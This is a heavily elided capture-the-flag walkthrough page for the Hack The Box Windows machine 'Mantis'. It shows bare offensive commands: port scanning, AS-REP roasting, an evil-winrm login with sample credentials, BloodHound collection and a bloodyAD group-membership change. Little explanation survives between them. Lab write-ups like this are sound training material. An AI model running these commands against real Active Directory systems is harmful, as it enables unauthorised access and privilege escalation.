...
layout: page
title: "HTB: Mantis"
subtitle: "hackthebox ctf htb-mantis nmap windows hard active-directory netexec evil-winrm bloodhound hashcat..."
...
hackthebox ctf htb-mantis hackthebox ctf htb-mantis nmap windows hard active-directory netexec evil-winrm bloodhound hashcat
...
**Mantis** is a hard 🪟 Windows machine hosted on Hack The Box. This guide covers the complete step-by-step walkthrough detailing reconnaissance, foothold exploitation, and privilege escalation vectors to compromise the host.
...
<div class="machine-info-box" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; background: var(--bg-card); border-left: 4px solid var(--text-success); border-top: 1px solid var(--border-color); border-right: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color); border-radius: var(--border-radius-lg); padding: var(--spacing-lg); margin-bottom: var(--spacing-xl);">
  ...
  <div style="display: flex; flex-direction: column; gap: 4px;">
    ...
    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700; font-family: monospace;">10.10.10.52</span>
  </div>
  <div style="display: flex; flex-direction: column; gap: 4px;">
...
```bash
vulnquest@kali$ sudo nmap -p- --reason --min-rate 10000 10.10.10.52
Starting Nmap
PORT      STATE SERVICE
53/tcp    open  domain
...
```bash
vulnquest@kali$ netexec smb 10.10.10.52 -u guest -p ''
SMB    10.10.10.52  445  DC01   [-] guest: STATUS_ACCOUNT_DISABLED
```
...
```bash
vulnquest@kali$ GetNPUsers.py -dc-ip 10.10.10.52 -no-pass -usersfile users.txt domain/
...
```bash
vulnquest@kali$ evil-winrm -i 10.10.10.52 -u web_svc -p password123
...
```bash
vulnquest@kali$ netexec ldap 10.10.10.52 -u web_svc -p password123 --bloodhound -c all
```
...
```bash
vulnquest@kali$ bloodyAD -u web_svc -p password123 --host 10.10.10.52 add groupMember IT_Support web_svc
```
